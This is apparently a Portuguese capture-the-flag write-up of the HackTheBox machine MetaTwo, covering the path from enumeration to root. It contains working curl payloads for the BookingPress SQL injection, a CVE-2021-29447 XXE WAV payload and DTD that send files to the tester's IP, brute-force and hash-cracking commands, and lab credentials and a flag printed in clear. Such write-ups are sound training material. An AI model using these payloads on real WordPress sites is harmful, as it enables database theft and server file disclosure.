# MetaTwo

## Enumeration

Ultilizei a ferramenta nmap para o scan inicial do servidor:
```
nmap -A -T4 -p- 10.10.11.186 | tee nmap-all.txt
```
Nmap Results: 
21/tcp open  ftp?
    | fingerprint-strings: 
    |   GenericLines: 
    |     220 ProFTPD Server (Debian)
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
    http-title: Did not follow redirect to http://metapress.htb/

Ao entrar no servidor WEB ele te redireciona para o dominio metapress.htb
Adicionando esse dns na minha maquina :
```
echo "10.10.11.186   metapress.htb" | sudo tee -a /etc/hosts 
```

Scan de Servidores WEB:
```
nikto -url 10.10.11.186| tee nikto.txt
```
Nikto Results: 
/: Retrieved x-powered-by header: PHP/8.0.24.
/wp-login.php: Wordpress login found. Olhando achamos => generator="WordPress/5.6.2" 

Como o servidor é WordPress, a melhor ferramenta para o trabalho é wpscan, um scan especializado em WordPress:
```
wpscan --url http://metapress.htb/ --enumerate
```
WPscan Results:
[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php

[!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8 (Caso logado)
[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
[i] User(s) Identified:
    [+] admin
    [+] manager

Scan com Dirbuster resultou em muuuuitos arquivos. 

## Tentativas Falhas

### SQL e SSTI
Olhando no blog temos um campo de pesquisa e no /wp-login. Testes:
SQLi (Wappalyzer diz que o banco é MySQL)
```
' OR 1=1 -- -
" OR 1=1 -- -
```
Tentando receber um codigo 500 ou resposta entranha:
```
${{<%[%'”}}%\.
```
_Sem Resultado_

### XML rpc
Xml rpc rota estava ativada
```
POST /xml.rpc
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
Retorna alguns metodos, porem nao encontrei nenhum util 

_Sem Resultado_

### Brute Force
Buscando ProFTPD exploit, encontrei mod_copy exploit, podendo rodar os comandos 'site cpfr' e 'site cpto' e acessando o servidor web, é possivel ter um RCE (Executar comandos remotamente e arbitrariamente)
Telneting no servidor ftp, conseguir rodar alguns comandos, porem nada util. (Pede Usuario e Senha)
Necessario de um login e senha valido para exploitar a maquina


Brute Force com hydra no /wp-login.php com usuario encontrado admin (Sinceramente no calor do momento não percebi o outro)
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt metapress.htb http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&testcookie=1:is incorrect" -V -K
```
_Sem Resultado_

Tentando fazer bruteforce no servidor ftp, formulei um script simples em python(ftp-brute.py) para tentar logar com algumas senhas default, tomando o usario que achei no WP-scan(admin) 
```
python3 ftp-brute.py 10.10.11.186 admin passw.txt
```
_Sem Resultado_

## Exploit

No source code do /events/ tem o plugin do calendario: 
```
<link rel='stylesheet' id='bookingpress_element_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10' media='all' />
```
Procurando no google bookingpress 1.0.10 exploit:

BookingPress < 1.0.11 - Unauthenticated SQL Injection
O input 'total_service' esta vulneravel a SQLi

Mas primeiro para testar essa vulnerabilidade precisamos do _wponce, que é um token gerado pelo servidor para garantir que foi o usuário que fez a requisição e não é algo forjado. Para isso ultilizei da ferramenta Burp Suite, que intercepta o tráfico de requisições e é possivel pegar esse token.

Requisição teste SQLi:
```
curl http://metapress.htb/wp-admin/admin-ajax.php -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' --data 'action=bookingpress_front_get_category_services&_wpnonce=b444da7ea7&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,@basedir,system_user(),schema() FROM information_schema.tables-- -' | jq
```
Conseguimos a versão 10.5.15-MariaDB-0+deb11u1, usuario do banco blog@localhost

Agora podemos extrair os logins. Pesquisando a estrutura de logins de wordpress, DBname = wp_users com principais fields user_login e user_pass:
``` 
curl http://metapress.htb/wp-admin/admin-ajax.php -H 'Cookie: wordpress_test_cookie=WP%20Cookie%20check' --data 'action=bookingpress_front_get_category_services&_wpnonce=b444da7ea7&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,user_login,user_pass FROM wp_users-- -' | jq
``` 
Conseguimos: admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. e manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

Usando hashcat para crackear as senhas:
```
hashcat -a 0 -m 400 metapress.htb.txt rockyou.txt
```
Crackeado credencial do usuário manager:partylikearockstar

### Logando no site

Logando com as credenciais e mexendo nas opções encontrei um upload de arquvios em /wp-admin/upload.php. Tentando mandar um arquivo .php o server manda um erro: "Sorry, this file type is not permitted for security reasons." 

Olhando novamente os resultados do WP scan encontramos um CVE com WordPress 5.6-5.7 (Source: https://github.com/AssassinUKG/CVE-2021-29447) envolvendo o upload de arquivos. Ao receber o payload o servidor executa fazendo uma requisição arbitraria para minha maquina, podendo assim ler qualquer arquivo que o www-data tenha permissao

Criando payload:
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.71:80/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Usando python server para servir o codigo a ser executado:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.71:80/?p=%file;'>" >
```

Após a preparação, dou o upload do arquivo 'payload.wav', onde o servidor executa o codigo XML nos retornando uma resposta em base 64, decoficando temos o conteudo do /etc/passwd encontrando o usuario da maquina jnelson

Tentativas de fazer o mesmo lendo alguns arquivos como /etc/shadow, /home/jnelson/.ssh/id_rsa
_Sem Resultado_

Apos ler o conteudo de /etc/nginx/sites-enabled/default podemos descobrir o PATH do servidor web: /var/www/metapress.htb/blog
Agora podemos ler wp-config.php em var/www/metapress.htb/blog/wp-config.php
wp-config.php:
```
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
```
Agora podemos logar no proftpd com metapress.htb:9NYS_ii@FyL_p5M2NvJ
E lá encontramos send_email.php com credencias de ssh => jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys

E vua la, estamos dentro.  ( ͡° ͜ʖ ͡°) 

## POST exploit

Logando como jnelson e enumerando a maquina, pelo comando `id` e `groups` descobrimos que jnelson nao esta em nenhum grupo diferente, pelo comando `find` nao ha nenhum arquivo suid, com `ps aux` so é possivel ver os processos do nosso usuario. 
Listando arquivos escondidos no nosso diretorio, ha uma pasta fora do comum. ".passpie" Ao pesquisar esse nome, passpie é um gerenciador de credenciais feita em python que usa gpg (software de criptografia   ). Ao iniciar o programa, tem uma tabela com senhas de login jnelson e de **root**. Ao verificar possiveis comandos para pegar essas senhas, temos o comando `passpie export senhas.txt`, porem é necessario uma senha mestre.
A vasculhar a fundo essa pasta encontramos um arquivo .keys, que contem gpg key public e key privada. Essa senha privada é ultilizada para descriptografar as senhas guardadas pelo passpie, e ela requer uma senha mestre para ser desbloqueada.

Ao copiar para minha maquina podemos usar a ferramenta `gpg2john` para transformar a senha mestre em um hash. Depois mandamos para a ferramenta john tentar quebrar essa senha.

```
gpg2john gpg.key > john.hash
john john.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Crackeado!!! Senha mestre: blink182
Ao usar o passpie para exportar as senha novamente pra um arquivo, podemos ler a senha de root:
...
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: !!python/unicode 'p7qfAZt4_A1xo_0x'
...
Ao trocar para o usuario root, podemos ler a flag em /root/root.txt:6628d695149a9d2b5783fffb361adebd